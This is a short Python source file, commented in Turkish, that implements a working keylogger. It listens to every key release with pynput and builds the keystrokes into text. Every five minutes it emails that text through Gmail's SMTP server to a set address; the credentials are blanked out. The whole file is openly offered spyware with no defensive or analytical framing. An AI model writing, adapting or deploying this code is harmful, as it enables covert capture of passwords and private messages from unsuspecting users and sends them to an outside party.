from pynput.keyboard import Key, Listener
import smtplib
import time

# Bu kod ile klavye yi dinliyerek klavyeden basılan tuşları 5 dakikada bir belirtilen mail adresine mail olarak atan kod. Gönderilen mailler spama düşüyor.
buffer = []
email_interval = 300  # 5 dakika (saniye cinsinden)
last_email_time = time.time()

# Eposta gönderme işlemi için gerekli SMTP değişkenleri
smtp_server = 'smtp.gmail.com'  # Eposta göndermek için kullanılan SMTP sunucusu
smtp_port = 587  # SMTP sunucusunun port numarası (Gmail için 587)
smtp_username = '-----------@gmail.com'  # Eposta göndermek için kullanılan eposta adresi
smtp_password = '--- ---- ---- ----'  # Gmail uygulama şifresi
to_email = '-----------@gmail.com'  # Epostanın gönderileceği alıcı eposta adresi


def send_email(data):
    # Tuşları düz metin haline getirin
    message = "".join(data) # buffer listesindeki verileri tek bir değer yapmak için
    message = message.replace("'", "") # içindeki tırnak işaretlerini temizlemek içi

    try:
        # SMTP sunucusuna bağlanma ve e-posta gönderme
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(smtp_username, smtp_password)
        server.sendmail(smtp_username, to_email, message)
        server.quit()

    except Exception as e:
        print(f"Hata: {e}")

# Verilerin buffer listesine eklemek için kullanılan fonksiyon 
def on_key_release(key):
    global last_email_time
    try:
        if key == Key.space:
            buffer.append(" ")
        elif key == Key.backspace:
            if len(buffer) > 0:
                buffer.pop()
        elif key == Key.enter:
            buffer.append("\n")
        elif key == Key.caps_lock:
            buffer.append(f"(caps_lock)")
        elif key in [Key.ctrl, Key.alt, Key.tab, Key.ctrl_l, Key.alt_l, Key.left, Key.shift_r, Key.alt_gr, Key.shift, Key.ctrl_r, Key.cmd, Key.right, Key.down, Key.up]:
            pass
        else:
            buffer.append(str(key))

    except Exception as e:
        print(f"Hata: {e}")

    # Mailleri belli zaman aralığında gönderme kontrolü
    if time.time() - last_email_time > email_interval:

        if len(buffer) >0:
            send_email(buffer)
            buffer.clear() # Mail yollandıktan sonra buffer listesi boşaltılır 
            last_email_time = time.time() # Zaman sıfırlanır

with Listener(on_release=on_key_release) as listener:
    listener.join()
